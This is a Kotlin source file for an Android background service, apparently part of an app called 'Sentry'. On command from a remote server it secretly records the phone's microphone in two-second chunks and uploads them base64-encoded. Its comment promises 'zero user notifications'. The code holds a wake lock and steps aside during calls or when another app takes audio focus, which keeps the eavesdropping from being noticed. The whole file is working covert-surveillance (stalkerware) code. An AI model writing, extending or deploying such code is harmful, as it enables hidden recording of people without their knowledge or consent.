package com.example.sentry.service

import android.content.Context
import android.media.AudioAttributes
import android.media.AudioFocusRequest
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.Build
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import com.example.sentry.crypto.CryptoManager
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import java.io.File
import kotlin.math.log10

/**
 * LiveAudioStreamManager streams real-time high quality (44.1 kHz) audio chunks
 * to Kinetix in the background with zero user notifications.
 *
 * It monitors AudioFocus and Phone call state:
 * If another app or incoming/outgoing call uses the mic, it immediately pauses
 * and releases the mic hardware, resuming automatically once the call/app ends.
 */
object LiveAudioStreamManager {
    private const val TAG = "LiveAudioStream"
    private var streamJob: Job? = null
    private var streamingLoopJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)

    @Volatile
    private var isStreamingEnabled = false

    @Volatile
    private var isMicConflictPaused = false

    private var audioManager: AudioManager? = null
    private var telephonyManager: TelephonyManager? = null
    private var focusRequest: AudioFocusRequest? = null
    private var sequenceCounter = 0

    fun startListening(context: Context) {
        if (streamJob?.isActive == true) return
        initFocusAndTelephonyListeners(context)

        streamJob = scope.launch {
            val client = SentryApiClient(context)
            val deviceId = CryptoManager.getOrCreateDeviceId(context)

            while (isActive) {
                try {
                    val cmdRes = client.pollLiveAudioCommand()
                    if (cmdRes.isSuccess) {
                        val cmdObj = cmdRes.getOrNull()
                        val shouldStream = cmdObj?.optBoolean("active", false) ?: false
                        val quality = cmdObj?.optString("quality", "HD") ?: "HD"

                        if (shouldStream && !isStreamingEnabled) {
                            isStreamingEnabled = true
                            SentryPersistentService.updateForegroundForAudio(true)
                            startStreamingLoop(context, deviceId, quality)
                        } else if (!shouldStream && isStreamingEnabled) {
                            isStreamingEnabled = false
                            SentryPersistentService.updateForegroundForAudio(false)
                            streamingLoopJob?.cancel()
                            streamingLoopJob = null
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Live audio command poll error: ${e.message}")
                }
                delay(1500)
            }
        }
    }

    private fun startStreamingLoop(context: Context, deviceId: String, quality: String) {
        streamingLoopJob?.cancel()
        streamingLoopJob = scope.launch {
            val client = SentryApiClient(context)
            Log.d(TAG, "Live audio streaming loop STARTED for device: $deviceId")

            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
            val wakeLock = try {
                powerManager?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Sentry::LiveAudioWakeLock")?.apply {
                    acquire(60 * 60 * 1000L) // 1 hour max safety lock
                }
            } catch (_: Exception) { null }

            try {
                while (isActive && isStreamingEnabled) {
                    if (isMicConflictPaused) {
                        // Report paused state so controller sees conflict status badge
                        try {
                            client.uploadLiveAudioChunk(
                                deviceId = deviceId,
                                base64 = null,
                                decibels = 0,
                                micStatus = "PAUSED_CONFLICT",
                                sequence = ++sequenceCounter
                            )
                        } catch (_: Exception) {}
                        delay(1200)
                        continue
                    }

                val chunkFile = File(context.cacheDir, "live_chunk_${System.currentTimeMillis()}.m4a")
                var recorder: MediaRecorder? = null
                var maxAmplitude = 0

                try {
                    recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        MediaRecorder(context)
                    } else {
                        @Suppress("DEPRECATION")
                        MediaRecorder()
                    }

                    val sampleRate = if (quality == "ECO") 22050 else 44100
                    val bitRate = if (quality == "ECO") 64000 else 128000

                    recorder.apply {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                        setAudioSamplingRate(sampleRate)
                        setAudioEncodingBitRate(bitRate)
                        setOutputFile(chunkFile.absolutePath)
                        prepare()
                        start()
                    }

                    // Sample amplitude across the recording duration
                    val durationMs = 2000L
                    val startTime = System.currentTimeMillis()
                    while (System.currentTimeMillis() - startTime < durationMs && isActive && isStreamingEnabled && !isMicConflictPaused) {
                        try {
                            val amp = recorder.maxAmplitude
                            if (amp > maxAmplitude) maxAmplitude = amp
                        } catch (_: Exception) {}
                        delay(200)
                    }

                    // Safely stop recorder
                    try {
                        recorder.stop()
                    } catch (_: Exception) {}
                    try {
                        recorder.release()
                    } catch (_: Exception) {}
                    recorder = null

                    if (chunkFile.exists() && chunkFile.length() > 300) {
                        val bytes = chunkFile.readBytes()
                        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        val decibels = if (maxAmplitude > 10) {
                            (20 * log10(maxAmplitude.toDouble())).toInt().coerceIn(25, 95)
                        } else {
                            35
                        }

                        val uploadRes = client.uploadLiveAudioChunk(
                            deviceId = deviceId,
                            base64 = base64,
                            decibels = decibels,
                            micStatus = "STREAMING",
                            sequence = ++sequenceCounter
                        )
                        Log.d(TAG, "Uploaded live chunk #$sequenceCounter (${bytes.size} bytes, $decibels dB, success=${uploadRes.isSuccess})")
                    }
                    } catch (e: Exception) {
                        Log.w(TAG, "Live audio chunk record error: ${e.message}")
                        delay(1000)
                    } finally {
                        try {
                            recorder?.release()
                        } catch (_: Exception) {}
                        if (chunkFile.exists()) {
                            chunkFile.delete()
                        }
                    }
                }
            } finally {
                try {
                    wakeLock?.release()
                } catch (_: Exception) {}
            }
            Log.d(TAG, "Live audio streaming loop STOPPED")
        }
    }

    private fun initFocusAndTelephonyListeners(context: Context) {
        try {
            audioManager = context.getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager

            val focusChangeListener = AudioManager.OnAudioFocusChangeListener { focusChange ->
                when (focusChange) {
                    AudioManager.AUDIOFOCUS_LOSS,
                    AudioManager.AUDIOFOCUS_LOSS_TRANSIENT,
                    AudioManager.AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK -> {
                        Log.d(TAG, "Mic conflict detected (Audio focus lost) -> Pausing live audio stream")
                        isMicConflictPaused = true
                    }
                    AudioManager.AUDIOFOCUS_GAIN -> {
                        Log.d(TAG, "Audio focus regained -> Resuming live audio stream")
                        isMicConflictPaused = false
                    }
                }
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                focusRequest = AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE)
                    .setAudioAttributes(
                        AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                            .build()
                    )
                    .setOnAudioFocusChangeListener(focusChangeListener)
                    .build()
            }

            // Monitor Call State (e.g. Regular phone calls or VoIP apps)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                telephonyManager?.registerTelephonyCallback(
                    context.mainExecutor,
                    object : TelephonyCallback(), TelephonyCallback.CallStateListener {
                        override fun onCallStateChanged(state: Int) {
                            handleCallState(state)
                        }
                    }
                )
            } else {
                @Suppress("DEPRECATION")
                telephonyManager?.listen(
                    object : PhoneStateListener() {
                        @Deprecated("Deprecated in Java")
                        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                            handleCallState(state)
                        }
                    },
                    @Suppress("DEPRECATION")
                    PhoneStateListener.LISTEN_CALL_STATE
                )
            }
        } catch (e: Exception) {
            Log.w(TAG, "Audio focus & telephony listener initialization warning: ${e.message}")
        }
    }

    private fun handleCallState(state: Int) {
        when (state) {
            TelephonyManager.CALL_STATE_RINGING,
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                Log.d(TAG, "Phone call in progress -> Pausing Sentry mic")
                isMicConflictPaused = true
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                Log.d(TAG, "Phone call ended -> Sentry mic auto-resuming")
                isMicConflictPaused = false
            }
        }
    }
}
